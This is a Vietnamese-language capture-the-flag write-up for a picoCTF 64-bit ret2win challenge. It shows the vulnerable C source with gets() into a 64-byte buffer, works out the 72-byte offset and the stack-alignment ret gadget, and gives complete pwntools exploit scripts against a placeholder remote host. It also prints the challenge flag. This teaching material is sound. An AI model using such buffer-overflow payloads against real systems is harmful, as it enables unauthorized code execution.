# picoCTF - 64-bit Ret2win

## Thông tin bài

Bài cho một chương trình 64-bit có hàm `flag()` dùng để đọc và in nội dung file `flag.txt`. Tuy nhiên trong luồng chạy bình thường, chương trình không gọi trực tiếp hàm `flag()`. Mục tiêu là lợi dụng lỗi buffer overflow để điều khiển luồng thực thi nhảy vào hàm `flag()`.

Flag tìm được:

```text
picoCTF{b1663r_15_b3773r_3e77a3f1}
```

---

## Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

---

## Phân tích lỗi

Trong hàm `vuln()` có đoạn:

```c
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}
```

`buf` có kích thước 64 byte, nhưng hàm `gets()` không kiểm tra số lượng dữ liệu nhập vào. Nếu nhập nhiều hơn 64 byte, dữ liệu sẽ tràn ra khỏi vùng nhớ của `buf` và ghi đè lên các giá trị khác trên stack.

Trong chương trình 64-bit, stack frame của hàm `vuln()` thường có dạng:

```text
địa chỉ cao
+----------------+
| saved RIP      |  địa chỉ trả về
+----------------+
| saved RBP      |  rbp cũ
+----------------+
| buf[64]        |
+----------------+
địa chỉ thấp
```

Trong đó:

- `buf` dài 64 byte.
- `saved RBP` dài 8 byte.
- `saved RIP` là địa chỉ mà chương trình sẽ quay về sau khi hàm `vuln()` kết thúc.

Vì vậy offset tới `saved RIP` là:

```text
64 + 8 = 72 byte
```

Nếu ta nhập:

```text
72 byte rác + địa chỉ hàm flag
```

thì khi hàm `vuln()` kết thúc, lệnh `ret` sẽ lấy địa chỉ hàm `flag()` từ stack và nhảy vào đó.

---

## Tìm địa chỉ hàm flag

Có thể dùng `nm`:

```bash
nm ./vuln | grep flag
```

Ví dụ kết quả:

```text
0000000000401236 T flag
```

Khi đó địa chỉ hàm `flag()` là:

```text
0x401236
```

Cũng có thể dùng GDB:

```gdb
p flag
```

hoặc:

```gdb
info functions flag
```

---

## Vấn đề căn chỉnh stack trong 64-bit

Payload cơ bản có thể là:

```python
payload = b"A" * 72 + p64(flag)
```

Tuy nhiên trong 64-bit, đôi khi payload này bị `Segmentation fault` dù offset và địa chỉ hàm `flag()` đều đúng.

Nguyên nhân là do vấn đề **stack alignment**, tức là căn chỉnh stack.

Theo chuẩn gọi hàm trên Linux 64-bit, stack cần được căn chỉnh theo 16 byte ở một số thời điểm khi gọi hàm. Trong hàm `flag()`, chương trình gọi các hàm thư viện như:

```c
fopen()
fgets()
printf()
```

Các hàm thư viện này có thể yêu cầu stack được căn chỉnh đúng. Nếu ta nhảy vào `flag()` bằng `ret` thay vì gọi hàm bằng `call`, trạng thái stack có thể bị lệch 8 byte.

Bình thường khi chương trình gọi hàm bằng `call`, CPU sẽ tự đẩy địa chỉ quay về lên stack:

```asm
call flag
```

Tương đương với:

```asm
push return_address
jmp flag
```

Nhưng trong ret2win, ta không dùng `call`. Ta ghi đè `saved RIP` để hàm `vuln()` chạy `ret` rồi nhảy thẳng vào `flag()`.

Vì thiếu bước giống như `call`, stack có thể bị lệch. Để sửa, ta chèn thêm một gadget `ret` trước địa chỉ `flag()`.

Payload sau khi căn chỉnh stack:

```python
payload = b"A" * 72 + p64(ret) + p64(flag)
```

Gadget `ret` chỉ là một địa chỉ chứa lệnh:

```asm
ret
```

Mỗi lần chạy `ret`, CPU lấy 8 byte ở `$rsp` đưa vào `$rip`, sau đó tăng `$rsp` thêm 8 byte. Vì vậy khi chèn thêm một `ret`, stack được dịch thêm 8 byte và trở về trạng thái căn chỉnh phù hợp hơn.

Luồng chạy sẽ là:

```text
vuln ret -> ret gadget -> flag
```

Thay vì:

```text
vuln ret -> flag
```

---

## Tìm gadget ret

Có thể dùng `ROPgadget`:

```bash
ROPgadget --binary ./vuln | grep " ret"
```

Ví dụ:

```text
0x000000000040101a : ret
```

Khi đó gadget `ret` là:

```text
0x40101a
```

Hoặc dùng pwntools để tự tìm:

```python
rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]
```

---

## Script khai thác remote

```python
from pwn import *

context.binary = "./vuln"
elf = context.binary

HOST = "HOST_CUA_DE"
PORT = 12345

p = remote(HOST, PORT)

flag = elf.symbols["flag"]

rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 72
payload += p64(ret)
payload += p64(flag)

p.sendline(payload)
p.interactive()
```

Nếu muốn ghi thủ công địa chỉ:

```python
from pwn import *

p = remote("HOST_CUA_DE", 12345)

ret  = 0x40101a
flag = 0x401236

payload = b"A" * 72 + p64(ret) + p64(flag)

p.sendline(payload)
p.interactive()
```

Lưu ý: cần thay `HOST_CUA_DE`, `PORT`, `ret`, và `flag` bằng giá trị thật của bài.

---

## Kết quả

Sau khi gửi payload, chương trình nhảy vào hàm `flag()` và in ra flag:

```text
picoCTF{b1663r_15_b3773r_3e77a3f1}
```

---

## Tổng kết

Lỗ hổng chính của bài là dùng `gets()` để nhập dữ liệu vào buffer 64 byte, dẫn tới buffer overflow. Vì chương trình 64-bit lưu `saved RBP` dài 8 byte trước `saved RIP`, offset tới địa chỉ trả về là 72 byte.

Payload cuối cùng:

```text
"A" * 72 + ret + flag
```

Trong đó:

- `"A" * 72` dùng để ghi đầy `buf` và đè qua `saved RBP`.
- `ret` dùng để căn chỉnh stack.
- `flag` là địa chỉ hàm đọc và in flag.

Đây là dạng bài ret2win 64-bit cơ bản, nhưng cần chú ý vấn đề căn chỉnh stack khi hàm đích gọi các hàm thư viện như `printf`, `fopen`, hoặc `system`.
